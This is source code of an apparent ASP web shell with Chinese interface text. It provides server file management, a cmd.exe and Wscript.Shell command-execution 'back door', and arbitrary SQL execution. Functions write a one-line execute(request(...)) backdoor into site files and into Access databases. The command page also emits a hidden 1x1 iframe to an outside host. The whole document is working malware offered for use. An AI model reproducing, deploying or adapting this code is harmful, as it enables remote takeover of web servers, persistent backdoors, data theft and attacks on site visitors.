	  &nbsp;切换目录:<a href="?pageName=fso&thePath=<%=encodeForUrl(WWWRoot,false)%>">【站点根目录】</a><a href="?pageName=fso&thePath=<%=encodeForUrl(RootPath,false)%>">【本程序目录】</a><a href="?pageName=fso&thePath=C:\Documents%20and%20Settings\">【C:\Docume~1】</a><a href="?pageName=fso&thePath=C:\Program%20Files\">【C:\progra~1】</a><a href="?pageName=fso&thePath=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere">【Pcanywhere】</a>
	</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=fso">
    <tr> 
      <td colspan="4" class="td">&nbsp;查看目录:
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="submit" name="Submit3" value="查看" onclick="location.href='?pageName=fso&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post">
    <tr> 
      <td colspan="4" class="td">&nbsp;新建名称: <input name="theName" type="text" id="theName2" size="15"> 
        <input type="button" name="Submit2" value="新建文件" onClick="if(this.form.theName.value==''){alert('请填写文件名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFile&theName='+this.form.theName.value;this.disabled=true;}"> 
        <input type="button" name="Submit4" value="新建目录" onClick="if(this.form.theName.value==''){alert('请填写文件夹名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFolder&theName='+this.form.theName.value;this.disabled=true;}"> 
        <span class="warningColor">〖新建文件和新建目录不能同名〗</span></td>
    </tr>
  </form>
  <form method="post" action="?pageName=fso&theAct=searchFolder" onsubmit="if(this.key.value==''){alert('请填写关键字!');return false;}else{this.Submit5.disabled=false;}" target="_blank">
    <tr> 
      <td colspan="4" class="td">&nbsp;检索目录: 
        <input name="path" type="text" id="path" value="<%=path%>" size="30">&nbsp;关键字:
		<input name="key" type="text" id="key" value="<%=key%>"> <input type="submit" name="Submit5" value="查找">&nbsp;〖用于查找存在的木马〗
	  </td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=fso&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="4" class="td">&nbsp;上传文件: <input name="file" type="file" size="15">&nbsp;保存为
	    <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr><td colspan="4" class="trHead">&nbsp;</td></tr>
  <tr> 
    <td width="30%" rowspan="2" valign="top" class="td"> 
      <%call fsoGetFolderList(thePath,true)%>
    </td>
  </tr>
  <tr> 
    <td width="555" colspan="3" valign="top"> 
	  <%call fsoGetFolderList(thePath,false)%>
      <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="500"></iframe>
      </div></td>
  </tr>
</table>
<a name="foot"></a>
<%
  showExecuteTime()
end sub
sub fsoGetFolderList(thePath,showFolder)
  dim i,ext,flag,list,theHref,href,theFiles,fileName,theFolder,theFolders
  if not fso.folderExists(thePath) then
	onErr("路径错误或者盘空或者没有权限的访问!")
  end if
  if len(thePath)=2 then thePath=thePath&"\"
  set theFolder=fso.getFolder(thePath)
  set theFiles=theFolder.files
  set theFolders=theFolder.subFolders
  if showFolder=true and getParentFolder(thePath)<>"" then
	echo("&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font class=warningColor>↑回上级目录</font></a><br>")
  end if
  on error resume next
  if showFolder=true then
	for each list in theFolders
	  echo("&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(list.path,false)&"""><font class=font-list>└■</font> ")
	  echo(fso.getFileName(list.path) & "")
	  echo("</a> <a href=javascript:; onclick=""fso_delFolder('"&encodeForUrl(list.path,true)&"','"&pathToUrl(list.path)&"')"">×删除</a><br>")
	next
  else
	echo("<table width=""98%"" border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"">")
	echo("<tr><td align=""center"" class=""td"">文件名</TD><TD align=""center"" class=""td"">大小</TD>")
	echo("<TD align=""center"" class=""td"">时间</TD><TD align=""center"" class=""td"">文件操作</TD></tr>")
	for each list in theFiles
	  ext = fso.getExtensionName(list.path)
	  flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
	  fileName = fso.getFileName(list.path)
	  if instr(list.path, Server.MapPath("\")) then
	    theHref = Mid(Replace(list.Path, Server.MapPath("\"), ""), 2)
	    href = ""
	    For i = 1 To len(theHref)
	      If Abs(Asc(Mid(theHref, i, 1))) > 255 Then
			href = href & Server.URLEncode(Mid(theHref, i, 1))
		  Else
			href = href & Mid(theHref, i, 1)
		  End If
		Next
		theHref = href
		echo("<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>")
		echo("<a href=""\" & theHref & """ title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间: "&list.DateLastModified&""" target=""_blank"">")
		if getStrLen(fileName)>40 then
		  fileName=getCutStr(fileName,40)&".."
		end if
		echo(fileName&"</a></td>")
	  else
		echo("<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>")
		echo("<font style=""cursor: hand;"" title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间: "&list.DateLastModified&""">")
		if getStrLen(fileName)>40 then fileName=getCutStr(fileName,40)&".."
		echo(fileName&"</font></td>")
	  end if
	  echo("<td align=center>" & getTheSize(list.size) & "</td><td align=left>&nbsp;"&list.DateLastModified&"</td><td align=center>")
	  if flag>0 then  echo("<a href=#foot onclick=""fso_editIt('"&pathToUrl(list.path)&"');""><font class=warningColor>Edit</font></a>|")
	  echo("<a href=javascript:; onclick=""fso_saveAs('"&encodeForUrl(list.path,true)&"','"&pathToUrl(list.path)&"');""><font class=warningColor>SaveAs</font></a>|")
  	  echo("<a href=javascript:; onclick=""stream_downIt('"&pathToUrl(list.path)&"');""><font class=warningColor>Down</font></a>|")
	  echo("<a href=javascript:; onclick=""fso_delFile('"&encodeForUrl(list.path,true)&"','"&pathToUrl(list.path)&"')""><font class=warningColor>Del</font></a>|")
	  if flag>0 then echo("<a href=javascript:; onclick=""fso_inject('"&encodeForUrl(list.path,true)&"','"&pathToUrl(list.path)&"')""><font class=warningColor>Inject</font></a>")
	  echo("</td></tr>"&vbNewline)
	next
	echo("</table>")
  end if
end sub
sub fsoEditFile(thePath)
  dim theFile
  on error resume next
  set theFile=fso.openTextFile(thePath,1,false)
  if err then
	echo("错误:"&err.description)
	err.clear
	response.end
  end if
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=fso&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td><input name="thePath" type="text" id="thePath3" value="<%=thePath%>" size="50"> 
        <input type="button" name="Submit62" value="查 看" onclick="location.href='?pageName=fso&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;"></td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(theFile.readAll())%></textarea></td>
    </tr>
    <tr> 
      <td height="30" align="right"><input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}">&nbsp;<input type="reset" value="重 置">&nbsp;</td>
    </tr>
  </form>
</table>
<%
  set theFile=nothing
  showExecuteTime()
end sub
sub fsoSaveAs(thePath,toPath)
  if lTrim(thePath)=lTrim(toPath) then
	echo("<script>alert('源路径与目标路径相同,操作停止!');</script>")
	response.end
  end if
  if fso.fileExists(thePath) then 
	fso.copyFile thePath,toPath
	echo("<script language=""javascript"">alert('另存为操作成功!');</script>")
  else
	echo("<script>alert('请确认源文件存在！');history.back();</script>")
  end if
end sub
sub fsoInject(thePath)
  dim theFile
  set theFile=fso.openTextFile(thePath,8,True,0)
  theFile.writeLine(" <script language=""vbscript"" runat=server>if request("""&clientPassword&""")<>"""" then execute(request("""&clientPassword&"""))</script>")
  theFile.close
  echo("<script language=""javascript"">alert('插入成功!\n请使用asp后门客户端访问以下文件\n"&encodeForUrl(thepath,true)&"');</script>")
  set theFile=nothing
end sub
sub fsoSaveToFile(thePath,fileContent)
  dim theFile
  set theFile=fso.openTextFile(thePath,2,true)
  theFile.write fileContent
  theFile.close
  set theFile=nothing
end sub
sub fsoDelFile(thePath)
  dim theFile
  set theFile=fso.getFile(thePath)
  theFile.delete true
  set theFile=nothing
end sub
sub fsoDelFolder(thePath)
  fso.deleteFolder thePath,true
end sub
sub searchFolder(folder,str)
  dim ext,n,title,theFile,theFolder
  echo("<br>检索目录:<font color=blue>"&folder&"</font><br>检索关键字:<font color=red>"&str&"</font><br>检索结果:<br>")
  for each theFile In folder.Files
	ext = LCase(Split(theFile, ".")(UBound(Split(theFile, "."))))
	if lcase(ext)="asp" or lcase(ext)="asa" or lcase(ext)="cer"  or lcase(ext)="cdx" then
	  if searchFile(theFile,str,title) then
	    echo("&nbsp;&nbsp;&nbsp;&nbsp;"&thefile.path&"<br>")
		n=n+1
	  end if
	end if
  next
  for each theFolder in folder.subFolders
	searchFolder theFolder,str
  next
end sub
rem ===================
rem    Cmd操作模块
rem ===================
sub pageCmdShell()
  isIn(1)
  dim cmdStr,cmdPath,cmdResult
  cmdStr=request("cmdStr")
  cmdPath=request("cmdPath")
  showTitle("Shell操作")
  if cmdPath="" then  cmdPath="cmd.exe"
  if cmdStr<>"" then
    if instr(lcase(cmdPath),lcase("cmd.exe"))>0 or instr(lcase(cmdPath),lcase(myCmdDotExeFile))>0 then
	  cmdResult=doCmdRun(cmdPath&" /c "&cmdStr)
    else
	  if lcase(cmdPath)=lcase("wscriptShell") then
	    cmdResult=doCmdRun(cmdStr)
	  else
	    cmdResult=doCmdRun(cmdPath&" "&cmdStr)
	  end if
    end if
  end if
  echo("<body onload=""document.forms[0].cmdStr.focus();"">")
%> 
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form action="?pageName=cmdShell" method="post" onSubmit="this.Submit.disabled=true">
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】Wscript.Shell Back Door</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
    <td height="22" class="td">&nbsp;路径: 
      <input name="cmdPath" type="text" id="cmdPath" value="<%=cmdPath%>" size="50">
      <input type="button" name="Submit2" value="使用wscript.shell" onClick="this.form.cmdPath.value='wscriptShell';"> </td>
  </tr>
  <tr> 
    <td height="22" class="td">&nbsp;命令/参数: 
      <input name="cmdStr" type="text" id="cmdStr" value="<%=server.htmlEncode(cmdStr)%>" size="70">
      <input type="submit" name="Submit" value="运 行">
    </td>
  </tr>
  <tr> 
    <td height="22" class="td">&nbsp;Rar命令行压缩：c:\progra~1\winrar\rar.exe a d:\web\test\web1.rar d:\web\test\web1
    </td>
  </tr>
  <tr> 
    <td height="22" class="td">&nbsp;<font color=red>注意:1.请只执行单步程序,程序执行开始到结束不需要人工干预.否则程序无法正常工作,并在服务器生成不可结束进程.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.该项操作会在当前目录生成一个名为"temp"的文件以保存执行结果，记得清理!</font>&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
	  <textarea name="cmdResult" cols="90" rows="22" id="cmdResult"><%=server.htmlEncode(cmdResult)%></textarea>
    </td>
  </tr>
</form>
</table>
<%
  echo("<iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe></body>")
  showExecuteTime()
end sub
rem ===================
rem    应用操作模块
rem ===================
sub pageApp()
  isIn(1)
  dim theAct,dirToView,dirCopyTo,dirCopyFrom,dirMoveTo,dirMoveFrom,appExePath,appExeFile
  theAct=request("theAct")
  dirToView=request("dirToView")
  dirCopyTo=request("dirCopyTo")
  dirCopyFrom=request("dirCopyFrom")
  dirMoveTo=request("dirMoveTo")
  dirMoveFrom=request("dirMoveFrom")
  appExePath=request("appExePath")
  appExeFile=request("appExeFile")
  showTitle("application操作页面")
%>
<table width=760 border=0 align="center" cellpadding=0 cellspacing=0 class="td">
  <tr height=18>       
    <td height="25">&nbsp;【<%=request.serverVariables("server_name")%>】Shell.Application Back Door</td>
  </tr>
  <tr>    
    <td align=center class="trHead">&nbsp;</td>
  </tr>
  <form method="post" action="?pageName=app&theAct=dirView" onsubmit="this.Submit.disabled=true;">
  <tr height=18> 
    <td height="30">&nbsp;输入要浏览的目录&nbsp;<input name=dirToView type=text id="dirToView" value="<%=dirToView%>" size="53">&nbsp;<input type="submit" name="Submit" value="执行">&nbsp;〖最后要加"\"〗</td>
  </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=dirCopy">
  <tr height=18> 
    <td height="30">&nbsp;把文件(夹)&nbsp;<input name=dirCopyFrom type=text id="dirCopyFrom" value="<%=dirCopyFrom%>" size="25" onsubmit="this.Submit2.disabled=true;">&nbsp;复制到&nbsp;<input name=dirCopyTo type=text id="dirCopyTo" value="<%=dirCopyTo%>" size="25">&nbsp;<input type="submit" name="Submit2" value="执行">&nbsp;〖最后不要加"\"〗</td>
  </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=dirMove" onsubmit="this.Submit3.disabled=true;">
    <tr height=18> 
      <td height="30">&nbsp;把文件(夹)&nbsp;<input name=dirMoveFrom type=text id="dirMoveFrom" value="<%=dirMoveFrom%>" size="25">&nbsp;移动到&nbsp;<input name=dirMoveTo type=text id="dirMoveTo" value="<%=dirMoveTo%>" size="25">&nbsp;<input type="submit" name="Submit3"  value="执行">&nbsp;〖最后不要加"\"〗</td>
    </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=appExe" onsubmit="this.Submit4.disabled=true;">
    <tr height=18> 
      <td height="30">&nbsp;程序路径：&nbsp;<input name=appExePath type=text id="appExePath" value="<%=appExePath%>" size="25">&nbsp;程序名&nbsp;<input name=appExeFile type=text id="appExeFile" value="<%=appExeFile%>" size="25">&nbsp;<input type="submit" name="Submit4" value="执行">&nbsp;〖在后台运行程序,不可以加参数〗</td>
    </tr>
  </form>
</table>
<div id="loaded" style="display:none;"> 
  <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="500"></iframe>
</div>
<%
  select case theAct
	case "dirView"
	  viewDir(dirToView)
	case "dirCopy"
	  dirOperate dirCopyFrom,dirCopyTo,"copy"
	case "dirMove"
	  dirOperate dirMoveFrom,dirMoveTo,"move"
	case "appExe"
	  exeApp appExePath,appExeFile
  end select
  showExecuteTime()
end sub
sub viewDir(dirToView)
  dim sa,co,fod,C1,C2
  if mid(dirToView,2,1)<>":" then onErr("请填写真实存在的绝对路径!")
  set sa=server.createObject(shellStr&"."&applicationStr)
  set fod=sa.namespace(dirToView)
  echo("<table align=center width=760 border=1>")
  on error resume next
  if getParentFolder(dirToView)<>"" then
	echo("<tr height=22 class=""td""><td colspan=2>&nbsp;<a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(getParentFolder(dirToView),false)&""">↑回到上级</a></td></tr>")
  end if
  for each co in fod.items
	if co.isFolder then
	  C1=C1&"<tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''""><td>&nbsp;<font class=font-list>└■</font><a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(co.path,false)&""">"&co.path&"</a></td><td align=center>"&getTheSize(co.size)&"&nbsp;</td></tr>"
	else
	  C2=C2&"<tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''""><td>&nbsp;<font class=font-list>□</font><a href=""javascript:;"" onclick=""stream_downIt('"&encodeForUrl(co.path,false)&"');"">"&co.path&"</a></td><td align=center>"&getTheSize(co.size)&"&nbsp;</td></tr>"
	end if
  next
  echo(C1&C2)
  if err then
	err.clear
	onErr "路径未找到!"
  end if
  echo("</table><br>")
  set sa=nothing
  set fod=nothing
end sub
sub dirOperate(dirFrom,dirTo,theAct)
  dim i,sa,fod1,fod2,path,path2,foditem
  if dirFrom="" or dirTo="" then onErr("请完整填写各项!")
  if (mid(dirFrom,2,1)<>":" or mid(dirTo,2,1)<>":") then onErr("请填写真实存在的绝对路径!")
  set sa=server.createobject(shellStr&"."&applicationStr)
  on error resume next
  set fod1=sa.namespace(dirTo)
  chkErr err,err.description&"');history.back('"
  path2=split(dirFrom,"\")(uBound(split(dirFrom,"\")))
  path=left(dirFrom,len(dirFrom)-len(path2)-1)
  if len(path)=2 then path=path&"\"
  set fod2=sa.namespace(path)
  set foditem=fod2.parsename(path2)
  chkErr err,err.description&"');history.back('"
  if theAct="copy" then
	fod1.copyHere foditem
	chkErr err,err.description&"');history.back('"
  end if
  if theAct="move" then
	fod1.moveHere foditem
	chkErr err,err.description&"');history.back('"
  end if
  echo("<center>命令成功完成!</center><br>")
  set sa=nothing
  set fod1=nothing
  set fod2=nothing
  set foditem=nothing
end sub
sub exeApp(appExePath,appExeFile)
  dim sa
  set sa=server.createObject(shellStr&"."&applicationStr)
  on error resume next
  sa.namespace(appExePath).items.item(appExeFile).invokeverb
  chkErr err,err.description&"');history.back('"
  echo("<center>命令成功完成!</center><br>")
  set sa=nothing
end sub
rem ===================
rem    数据库操作模块
rem ===================
sub pageSql()
  isIn(1)
  dim theAct,sqlStr
  theAct=request("theAct")
  sqlStr=request("sqlStr")
  showTitle("mdb+mssql数据库操作页")
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=sql&theAct=CreateMdb">
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】新建MDB数据库</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td">&nbsp;新建MDB数据库的路径+名称:&nbsp;<input name="mdbname" type="text" size="60" value="<%=RootPath%>\new.mdb">
	  <input name="Submit" type="submit" id="Submit" value="提 交" onClick="if(this.form.mdbname.value==''){alert('请完整填写数据库名称!');return false;}">
	</td>
  </tr>
</form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=sql&theAct=showTables" onsubmit="this.Submit.disabled=true;">
  <tr> 
    <td height="22" align="center" class="td"><a href="?pageName=sql">mdb+mssql数据库操作</a></td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
    <td height="50" align="center" class="td"> 
      <input name="sqlStr" type="text" id="sqlStr" value="<%=sqlStr%>" size="60">
    </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
	  <input type="submit" name="Submit" value="提 交">
	  <input type="button" name="Submit2" value="插 入" onclick="if(confirm('这里是在ACESS数据里插入ASP后门\n服务器端变量名称为<%=clientPassword%>\n后门插入后可以使用的前提是\n数据库是asp后缀,并且没有错乱asp代码\n确认操作吗?')){location.href='?pageName=sql&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}">
	  <input type="button" name="Submit3" value="提 示" onClick="alert('插入只针对ACESS操作,\n要浏览ACESS在表单中的写法是,d:\\bbs.mdb\nSQL据库写法是,sql:连接字符串,不要忘写sql:')">
	  <input type="button" value="示 例" onclick="this.form.sqlStr.value='e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';">
    </td>
  </tr>
</form>
</table>
<%
  select case theAct
    case "CreateMdb"
      CreateMdb()
	case "showTables"
	  showTables()
	case "query"
	  showQuery()
	case "inject"
	  accessInject()
  end select
  showExecuteTime()
end sub
sub CreateMdb() 
  dim Cermdb,mdbname
  mdbname=request("mdbname")
  on error resume next
  Set Cermdb=CreateObject("ADOX.Catalog")
  Cermdb.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&mdbname)
  chkErr err,encodeForUrl(err.description,true)
  echo("<script language=""javascript"">alert('数据库创建成功!');</script>")
  Set Cermdb=Nothing
End sub
sub showTables()
	dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
	sqlStr=request("sqlStr")
	if lcase(left(sqlStr,4))="sql:" then
		connStr=mid(sqlStr,5)
	else
		connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
	end if
	set conn=server.createObject("adodb.connection")
	on error resume next
	conn.open connStr
	chkErr err,encodeForUrl(err.description&"\n"&sqlStr,true)
	set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))
	do until rsTable.eof
		tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&enCodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
		rsTable.moveNext
	loop
	rsTable.moveFirst
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">数据库表结构查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td valign="top" class="td"><%=tablesStr%><br> <br> </td>
    <td align="center" valign="top"><a href="<%="?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&""%>">转到SQL命令执行</a> 
<%
	do until rsTable.eof
		set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
%>
      <br> 
      <table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="22" colspan="6" class="tr"><b><%=rsTable("Table_Name")%></b></td>
        </tr>
        <tr align="center"> 
          <td class="td">字段名</td>
          <td class="td">类型</td>
          <td class="td">大小</td>
          <td class="td">精度</td>
          <td class="td">允许为空</td>
          <td class="td">默认值</td>
        </tr>
<%
		loopI=0
		do until rsColumn.eof
			loopI=loopI+1
			if loopI>sqlMaxLoopI then
				exit do
			end if
%>
        <tr align="center" onmouseout="this.className='';" onmouseover="this.className='td';"> 
          <td align="left">&nbsp;<%=rsColumn("Column_Name")%></td>
          <td width="80"><%=getDataType(rsColumn("Data_Type"))%></td>
          <td width="70"><%=rsColumn("Character_Maximum_Length")%></td>

          <td width="70"><%=rsColumn("Numeric_Precision")%></td>
          <td width="70"><%=rsColumn("Is_Nullable")%></td>
          <td width="80"><%=rsColumn("Column_Default")%></td>
        </tr>
<%
			rsColumn.moveNext
		loop
%>
      </table>
<%
		rsTable.moveNext
	loop
%>
    </td>
  </tr>
</table>
<%
	conn.close
	set conn=nothing
	set rsTable=nothing
	set rsColumn=nothing
end sub
sub showQuery()
	dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
	sql=request("sql")
	page=request("page")
	sqlStr=request("sqlStr")
	theTable=request("theTable")
	if not isNumeric(page) or page="" then
		page=1
	end if
	if sql="" and theTable<>"" then
		sql="select top 10 * from ["&theTable&"]"
	end if
	if lcase(left(sqlStr,4))="sql:" then
		connStr=mid(sqlStr,5)
	else
		connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
	end if
	set rs=server.createObject("adodb.recordSet")
	set conn=server.createObject("adodb.connection")
	on error resume next
	conn.open connStr
	chkErr err,"无法打开: "&sqlStr
	set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))
	do until rsTable.eof
		tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&encodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
		rsTable.moveNext
	loop
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>&sql=<%=enCodeForUrl(sql,false)%>">SQL命令执行及查看</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" action="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>">
    <tr> 
      <td width="150" valign="top" class="td"><%=tablesStr%><br> <br> </td>
      <td align="center" valign="top"><br> 
        <input name="sql" type="text" id="sql" value="<%=server.htmlEncode(sql)%>" size="60"> 
        <input type="submit" name="Submit4" value="执行查询"> <br> 
<%
	if sql<>"" and left(lcase(sql),7)="select " then
		rs.open sql,conn,1,1
		chkErr err,encodeForUrl("错误信息: "&err.description,true)
		rs.pageSize=20
		if not rs.eof then
			rs.absolutePage=page
		end if
		if rs.fields.count>0 then
			echo("<br><table border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"" width=""98%"">")
			echo("<tr>")
			echo("<td height=""22"" align=""center"" class=""tr"" colspan="""&rs.fields.count&""">SQL操作 - 执行结果</td>")
			echo("</tr>")
			echo("<tr>")
			for j=0 to rs.fields.count-1
				echo("<td height=""22"" align=""center"" class=""td""> "&rs.fields(j).name&" </td>")
			next
			for i=1 to 20
				if rs.eof then
					exit for
				end if
				echo("</tr>")
				echo("<tr onmouseover=""javascript:this.className='td';"" onmouseout=""javascript:this.className='';"" valign=top>")
				for j=0 to rs.fields.count-1
					echo("<td height=""22"" align=""center"">"&server.htmlEncode(fixNull(rs(j)))&"</td>")
				next
				echo "</tr>"
				rs.movenext
			next
		end if
		echo("<tr>")
		echo("<td height=""22"" align=""center"" class=""td"" colspan="""&rs.fields.count&""">")
		for i=1 to rs.pagecount
			echo(replace("<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&sql=" & encodeForUrl(sql, False) & "&page="&i&"""><font {$font"&i&"}>"&i&"</font></a> ","{$font"&page&"}","class=warningColor"))
		next
		echo("</td></tr></table><br>")
		rs.close
	else
	 	if sql<>"" then
			on error resume next
			conn.execute(sql)
			chkErr err,encodeForUrl(err.description&sql,true)
			echo("<center><br>执行完毕!</center>")
		end if
	end if
%>
      </td>
    </tr>
  </form>
</table>
<br>
<%		
	conn.close
	set rs=nothing
	set conn=nothing
	set rsTable=nothing
end sub
sub accessInject()
	dim rs,conn,sqlStr,connStr
	sqlStr=request("sqlStr")
	if lcase(left(sqlStr,4))="sql:" then
		onErr("插入只对ACCESS数据库有效!")
	else
		connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
	end if
	set rs=server.createObject("adodb.recordSet")
	set conn=server.createObject("adodb.connection")
	on error resume next
	conn.open connStr
	chkErr err,"无法打开: "&sqlStr
	if notdownloadsExists=true then
		conn.execute("drop table notdownloads")
	end if
	conn.execute("create table notdownloads(notdownloads oleobject)")
	rs.open "notdownloads",conn,1,3
	rs.addnew
	rs("notdownloads").appendchunk(chrB(asc("<"))&chrB(asc("%"))&chrB(asc("e"))&chrB(asc("x"))&chrB(asc("e"))&chrB(asc("c"))&chrB(asc("u"))&chrB(asc("t"))&chrB(asc("e"))&chrB(asc("("))&chrB(asc("r"))&chrB(asc("e"))&chrB(asc("q"))&chrB(asc("u"))&chrB(asc("e"))&chrB(asc("s"))&chrB(asc("t"))&chrB(asc("("))&chrB(asc(""""))&chrB(asc(clientPassword))&chrB(asc(""""))&chrB(asc(")"))&chrB(asc(")"))&chrB(asc("%"))&chrB(asc(">"))&chrB(asc(" ")))
    rs.update
   	rs.close
	echo("<script language=""javascript"">alert('插入成功!');history.back();</script>")
	conn.close
	set rs=nothing
	set conn=nothing
end sub
rem ===================
rem    其他操作模块
rem ===================
sub pageUpload()
  isIn(1)
  dim theAct,thePath,fileName
  theAct=request("theAct")
  thePath=request("thePath")
  fileName=request("fileName")
  showTitle("其它操作页面")
  if thePath="" then thePath=server.mapPath(".")
  if theAct="upload" then
	streamUpload thePath,fileName
	echo("<script language=""javascript"">location.href='?pageName=upload';</script>")
  end if
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" enctype="multipart/form-data" action="?pageName=upload&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】Adodb.Stream File Upload</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td">
	  <input name="file" type="file">&nbsp;保存为
	  <input name="fileName" type="text" value="<%=thePath%>" size="40">
	  <input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
	  <input type="checkbox" name="writeMode" value="True">覆盖模式
    </td>
  </tr>
</form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】数制转换</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td"> 
      <input type=text name=text1 value=字符和数字转10和16进制 size=25 id=text9> 
      <input name="按钮" type=button onclick="main();" value="给我转"> <input type="text" name="vars" value=16进制转10进制和字符 size=25 id=vars2> 
      <input name="按钮2" type=button onClick="main2();" value="给我转"> </td>
  </tr>
</table>
<script language=vbs>
sub main()
  base=document.all.text9.value
  If IsNumeric(base) Then
	cc=hex(cstr(base))
